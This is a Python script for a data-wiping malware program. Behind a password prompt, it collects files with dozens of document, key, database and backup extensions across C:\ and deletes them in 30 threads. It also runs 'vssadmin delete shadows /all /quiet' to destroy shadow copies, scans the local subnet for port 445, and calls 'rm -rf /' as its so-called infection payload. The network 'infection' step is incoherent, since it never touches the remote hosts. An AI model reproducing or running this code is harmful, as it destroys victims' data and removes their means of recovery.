import os
import subprocess
import socket
from threading import Thread
from queue import Queue

safeguard = input('Please put password in to start the program: ')
if safeguard != 'Seraphim':
    quit()


# File extensions to locate files
incinerated_ext = ('.txt', '.png', '.jpg', '.jpeg', '.der',
                   '.pfx', '.key', '.crt', '.csr', '.pem',
                   '.odt', '.ott', '.sxw', '.stw', '.uot',
                   '.max', '.ods', '.ots', '.sxc', '.stc',
                   '.dif', '.slk', '.odp', '.otp', '.sxd',
                   'std', '.uop', '.odg', '.otg', '.sxm',
                   '.mml', '.lay', '.lay6', '.asc', '.sqlite3',
                   '.sqlitedb', '.sql', '.accdb', '.mdb', '.dfb',
                   '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf',
                   '.ldf', '.sln', '.suo', '.cpp', '.pas', '.asm',
                   '.cmd', '. bat', '.vbs', '.dip', '.dch', '.sch',
                   '.brd', '.jsp', '.php', '.asp', '.java', '.jar',
                   '.class', '.wav', '.swf', '.fla', '.wmv', '.mpg',
                   ',vob', '.mpeg', '.asf', '.avi', '.mov', '.mkv',
                   '.flv', '.wma', '.mid', '.djvu', '.svg', '.psd',
                   '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif',
                   '.bmp', '.vcd', '.iso', '.backup', '.zip', '.rar',
                   '.tgz', '.tar', '.bak', '.tbk', '.paq', '.arc',
                   '.aes', '.gpg', '.wmx', '.wmdk', '.vdi', '.sldm',
                   '.sldx', '.sti', '.sxi', '.hwp', '.snt', '.onetoc2',
                   '.dwg', '.pdf', '.wks', '.rtf', '.csv', '.vsdx',
                   '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst',
                   '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps',
                   '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx',
                   '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx',
                   '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx',
                   '.doc')

# Grab all files from the machine
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in incinerated_ext:
            file_paths.append(root+'\\'+file)

# Function to delete shadow copies
def delete_shadow_copies():
    subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"])

# Function to incinerate files
def incinerate():
    while not q.empty():
        file = q.get()
        try:
            os.remove(file)
        except:
            pass
        q.task_done()

# Function to get the local IP address
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

# Function to scan the network for infected hosts
def scan_network(ip_prefix):
    infected_hosts = []
    for i in range(1, 256):
        ip = f"{ip_prefix}.{i}"
        if ip == get_local_ip():
            continue
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((ip, 445))
            if result == 0:
                infected_hosts.append(ip)
            sock.close()
        except:
            continue
    return infected_hosts

# Function to infect the hosts with the malicious payload
def infect_hosts(infected_hosts):
    for host in infected_hosts:
        # Execute malicious payload here
        subprocess.run(["rm", "-rf", "/"])

# Main function
if __name__ == "__main__":
    local_ip = get_local_ip()
    ip_prefix = ".".join(local_ip.split(".")[:-1])
    infected_hosts = scan_network(ip_prefix)
    infect_hosts(infected_hosts)

    # Delete shadow copies
    delete_shadow_copies()

    # Incinerate files
    q = Queue()
    for file in file_paths:
        q.put(file)
    for i in range(30):
        thread = Thread(target=incinerate, daemon=True)
        thread.start()
    q.join()